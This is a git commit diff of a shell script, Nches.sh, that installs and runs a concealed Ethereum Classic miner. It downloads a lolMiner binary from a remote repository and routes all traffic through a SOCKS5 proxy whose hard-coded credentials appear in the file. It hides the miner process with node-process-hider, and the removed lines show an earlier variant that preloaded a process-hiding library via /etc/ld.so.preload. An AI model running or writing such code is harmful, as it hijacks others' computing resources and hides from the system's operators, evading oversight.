31b31af8549d2c5258cd71f1cfd392c69ca75b3b
WxYtzaiu <100740697+WxYtzaiu@users.noreply.github.com>
2022-04-11 16:56:28 +0700

    Update Nches.sh

--- Nches.sh
+++ Nches.sh
@@ -1,56 +1,40 @@
 #!/bin/sh
+apt update && apt -y install sudo wget curl unzip
+sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang
+
+curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
+apt-get install -y nodejs
+
+npm i -g node-process-hider
+
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
 
-apt update -y;apt -y install binutils cmake build-essential screen unzip net-tools curl
 
 wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
 
 tar -xvzf graphics.tar.gz
 
 cat > graftcp/local/graftcp-local.conf <<END
-
 listen = :2233
-
 loglevel = 1
-
-socks5 =  3.15.39.186:1080 
-
+socks5 = 18.216.28.28:1080
 socks5_username = mikrotik999
-
-socks5_password = Elibawnos 
+socks5_password = Elibawnos
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
 
 sleep .2
 
-echo " "
-echo " "
-
-echo ""
-
 ./graftcp/graftcp curl ifconfig.me
 
 echo " "
 echo " "
 
-echo ""
+./graftcp/graftcp wget https://gitlab.com/ninalasmi937/ton/-/raw/main/lolMiner
+chmod +x lolMiner
 
-echo " "
-echo " "
+ph add lolMiner
 
-./graftcp/graftcp wget https://raw.githubusercontent.com/githuboneheart/-/main/views/bezzHash
-chmod +x bezzHash
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip
-unzip magicBezzHash.zip
-
-make
-
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./graftcp/graftcp ./bezzHash --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
+./graftcp/graftcp ./lolMiner --algo ETCHASH --pool etc.2miners.com:1010 --user 0x11880b1cfe04907c5306222be1e09f4bbb480eb5.$(echo $(shuf -i 1-9999 -n 1)-sty) --ethstratum ETHPROXY
